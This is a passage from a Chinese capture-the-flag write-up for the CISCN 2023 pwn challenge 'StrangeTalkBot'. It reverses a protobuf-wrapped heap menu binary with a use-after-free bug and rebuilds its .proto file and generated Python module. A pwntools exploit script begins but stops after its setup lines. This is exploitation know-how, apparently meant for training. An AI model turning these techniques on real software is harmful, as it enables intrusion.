href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>这道题是ciscn2023的第二道pwn题。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_io();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;byte_A060, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>);</span><br><span class="line">    v3 = read(<span class="number">0</span>, &amp;byte_A060, <span class="number">0x400</span>uLL);</span><br><span class="line">    v4 = (_QWORD *)sub_192D(<span class="number">0LL</span>, v3, &amp;byte_A060);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_155D(v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>], v4[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  errExit(<span class="number">0LL</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，题目主干比较清晰。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_155D</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 opt,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 idx,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 chunk_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 content_size,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> <span class="keyword">void</span> *content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  size = chunk_size;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x21</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)content_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)chunk_size &gt;= <span class="number">0xF1</span> )</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">if</span> ( chunk_size &lt; content_size )</span><br><span class="line">    size = content_size;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">delete</span>(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)show(idx);</span><br><span class="line">  <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">char</span> *)create(idx, size, content_size, content);</span><br><span class="line">  <span class="keyword">if</span> ( opt != <span class="number">2</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">    errExit();</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">char</span> *)edit(idx, content_size, content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数内部其实就是很经典的菜单类堆题，并且题目中的漏洞也很简单，就是一个很单纯的UAF。麻烦的是<code>sub_192D</code>函数内部的<code>sub_5090</code>有很长的代码。虽然我也不知道怎么猜的，但是他就是<code>protobuf</code>对应的<code>unpack</code>函数。</p><h3 id="理解题目中的protobuf"><a href="#理解题目中的protobuf" class="headerlink" title="理解题目中的protobuf"></a>理解题目中的protobuf</h3><p>需要理解的话，首先就是需要确定题目中各个函数的含义以及部分可能需要知道的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_192D</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_5090(&amp;unk_9C80, a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数内部只是调用了另外一个函数，并且返回出另外函数的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_5090</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">const</span> ProtobufCMessageDescriptor *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">        ProtobufCAllocator *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int64 count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">unsigned</span> __int8 *content)</span></span></span><br></pre></td></tr></table></figure><p>然而这个函数的返回值是一个指针(参数的类型都是已经经过了我的修改了)。其实通过对比可以发现结构很类似上述中的<code>unpack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Test *<span class="title">test__unpack</span><span class="params">(ProtobufCAllocator  *allocator, <span class="keyword">size_t</span> len, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *) protobuf_c_message_unpack (&amp;test__descriptor, allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，可以通过搜索其内部的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">actionid_str = desc-&gt;fields_sorted_by_name;</span><br><span class="line">canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">if</span> ( desc-&gt;magic != <span class="number">0x28AAEEF9</span> )</span><br><span class="line">  __assert_fail(</span><br><span class="line">  <span class="string">&quot;(desc)-&gt;magic == BINARYBF_C__MESSAGE_DESCRIPTOR_MAGIC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;BINARYBF-c/BINARYBF-c.c&quot;</span>,</span><br><span class="line">  <span class="number">0xBF2</span>u,</span><br><span class="line">  <span class="string">&quot;BINARYBF_c_message_unpack&quot;</span>);</span><br></pre></td></tr></table></figure><p>比如函数开头的assert即可搜索到其源码位置。所以这个1200多行的函数其实就是<code>protobuf_c_message_unpack</code>函数。</p><p>那么就可以通过这个函数所使用的参数，直接在ida中添加结构体进行进一步分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ProtobufCMessageDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x78</span>, mappedto_19)</span><br><span class="line"><span class="number">00000000</span> magic dd ?</span><br><span class="line"><span class="number">00000004</span> name dq ?</span><br><span class="line"><span class="number">0000000</span>C short_name dq ?</span><br><span class="line"><span class="number">00000014</span> c_name dq ?</span><br><span class="line"><span class="number">0000001</span>C package_name dq ?</span><br><span class="line"><span class="number">00000024</span> sizeof_message dq ?</span><br><span class="line"><span class="number">0000002</span>C n_fields dd ?</span><br><span class="line"><span class="number">00000030</span> fields dq ?</span><br><span class="line"><span class="number">00000038</span> fields_sorted_by_name dq ?</span><br><span class="line"><span class="number">00000040</span> n_field_ranges dd ?</span><br><span class="line"><span class="number">00000044</span> field_ranges dq ?</span><br><span class="line"><span class="number">0000004</span>C message_init ProtobufCMessage ?</span><br><span class="line"><span class="number">00000060</span> reserved1 dq ?</span><br><span class="line"><span class="number">00000068</span> reserved2 dq ?</span><br><span class="line"><span class="number">00000070</span> reserved3 dq ?</span><br><span class="line"><span class="number">00000078</span> ProtobufCMessageDescriptor ends</span><br><span class="line"><span class="number">00000078</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCMessage struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: ProtobufCMessageDescriptor/r</span><br><span class="line"><span class="number">00000000</span> descriptor dq ?</span><br><span class="line"><span class="number">00000008</span> n_unknown_fields dd ?</span><br><span class="line"><span class="number">0000000</span>C unknown_fields dq ?</span><br><span class="line"><span class="number">00000014</span> ProtobufCMessage ends</span><br><span class="line"><span class="number">00000014</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCAllocator struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_22)</span><br><span class="line"><span class="number">00000000</span> alloc dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">free</span> dq ?</span><br><span class="line"><span class="number">00000010</span> allocator_data dq ?</span><br><span class="line"><span class="number">00000018</span> ProtobufCAllocator ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCFieldDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x44</span>, mappedto_23)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .data.rel.ro:stru_9B60/r</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> id dd ?</span><br><span class="line"><span class="number">0000000</span>C label dd ?</span><br><span class="line"><span class="number">00000010</span> type dd ?</span><br><span class="line"><span class="number">00000014</span> quantifier_offset dd ?</span><br><span class="line"><span class="number">00000018</span> offset dd ?</span><br><span class="line"><span class="number">0000001</span>C descriptor dq ?</span><br><span class="line"><span class="number">00000024</span> default_value dq ?</span><br><span class="line"><span class="number">0000002</span>C flags dd ?</span><br><span class="line"><span class="number">00000030</span> reserved_flags dd ?</span><br><span class="line"><span class="number">00000034</span> reserved2 dq ?</span><br><span class="line"><span class="number">0000003</span>C reserved3 dq ?</span><br><span class="line"><span class="number">00000044</span> ProtobufCFieldDescriptor ends</span><br></pre></td></tr></table></figure><p>在前面我们提到了<code>ProtobufCFieldDescriptor</code>结构体，这个结构体中存储着结构体中所有成员的数据类型，并且第一个成员是指向其名字的地址，那么我们可以根据字符串找到结构体相印的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8↓o</span><br><span class="line">.data.rel.ro:0000000000009BA4 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA5 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA6 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA7 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009BEC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BED 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009C34 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C35 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C36 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C37 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Devicemsg</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用上述代码生成<code>python</code>对应的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: Devicemsg.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\x0f\x44\x65vicemsg.proto\&quot;R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DEVICEMSG = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;actionid&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.actionid&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgidx&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgidx&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgsize&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgsize&#x27;</span>, index=<span class="number">2</span>,</span><br><span class="line">      number=<span class="number">3</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgcontent&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgcontent&#x27;</span>, index=<span class="number">3</span>,</span><br><span class="line">      number=<span class="number">4</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">19</span>,</span><br><span class="line">  serialized_end=<span class="number">101</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;Devicemsg&#x27;</span>] = _DEVICEMSG</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">Devicemsg = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;Devicemsg&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _DEVICEMSG,</span><br><span class="line">  __module__ = <span class="string">&#x27;Devicemsg_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:Devicemsg)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(Devicemsg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure><p>现在就只需要拿着这个文件去使用即可，后续的漏洞利用部分比较简单，这里就不详细说了。</p><h3 id="综上可得，exp"><a href="#综上可得，exp" class="headerlink" title="综上可得，exp"></a>综上可得，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span 